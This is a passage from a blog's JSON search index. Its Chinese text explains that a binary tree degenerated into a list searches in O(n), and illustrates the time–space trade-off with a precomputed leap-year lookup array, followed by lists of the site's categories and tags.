列表二叉树如果二叉树退变为列表了，则 n 个节点的高度或者说是长度变为了n，查找效率为O(n)，变成了顺序查找。 一般二叉树介于「列表二叉树」与「平衡二叉树」之间，查找性能也在O(Log2n)到O(n)之间。 时间与空间对于一个算法，其时间复杂度和空间复杂度往往是相互影响的。 比如说，要判断某某年是不是闰年： 可以编写一个算法来计算，这也就意味着，每次给一个年份，都是要通过计算得到是否是闰年的结果。 还有另一个办法就是，事先建立一个有 5555 个元素的数组（年数比现实多就行），然后把所有的年份按下标的数字对应，如果是闰年，此数组项的值就是1，如果不是值为0。这样，所谓的判断某一年是否是闰年，就变成了查找这个数组的某一项的值是多少的问题。此时，我们的运算是最小化了，但是硬盘上或者内存中需要存储这 5555 个 0 和 1 。这就是典型的使用空间换时间的概念。 当追求一个较好的时间复杂度时，可能会使空间复杂度的性能变差，即可能导致占用较多的存储空间；反之，求一个较好的空间复杂度时，可能会使时间复杂度的性能变差，即可能导致占用较长的运行时间。 另外，算法的所有性能之间都存在着或多或少的相互影响。因此，当设计一个算法(特别是大型算法)时，要综合考虑算法的各项性能，算法的使用频率，算法处理的数据量的大小，算法描述语言的特性，算法运行的机器系统环境等各方面因素，才能够设计出比较好的算法。","categories":[{"name":"算法","slug":"算法","permalink":"https://yeyeyeyeto.github.io/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]}],"categories":[{"name":"Blender","slug":"Blender","permalink":"https://yeyeyeyeto.github.io/categories/Blender/"},{"name":"哲学","slug":"哲学","permalink":"https://yeyeyeyeto.github.io/categories/%E5%93%B2%E5%AD%A6/"},{"name":"安全","slug":"安全","permalink":"https://yeyeyeyeto.github.io/categories/%E5%AE%89%E5%85%A8/"},{"name":"工具","slug":"工具","permalink":"https://yeyeyeyeto.github.io/categories/%E5%B7%A5%E5%85%B7/"},{"name":"日记","slug":"日记","permalink":"https://yeyeyeyeto.github.io/categories/%E6%97%A5%E8%AE%B0/"},{"name":"Java","slug":"Java","permalink":"https://yeyeyeyeto.github.io/categories/Java/"},{"name":"算法","slug":"算法","permalink":"https://yeyeyeyeto.github.io/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"心理","slug":"心理","permalink":"https://yeyeyeyeto.github.io/tags/%E5%BF%83%E7%90%86/"},{"name":"角色绑定","slug":"角色绑定","permalink":"https://yeyeyeyeto.github.io/tags/%E8%A7%92%E8%89%B2%E7%BB%91%E5%AE%9A/"},{"name":"AI动作捕捉","slug":"AI动作捕捉","permalink":"https://yeyeyeyeto.github.io/tags/AI%E5%8A%A8%E4%BD%9C%E6%8D%95%E6%8D%89/"},{"name":"认知","slug":"认知","permalink":"https://yeyeyeyeto.github.io/tags/%E8%AE%A4%E7%9F%A5/"},{"name":"受害者","slug":"受害者","permalink":"https://yeyeyeyeto.github.io/tags/%E5%8F%97%E5%AE%B3%E8%80%85/"}]}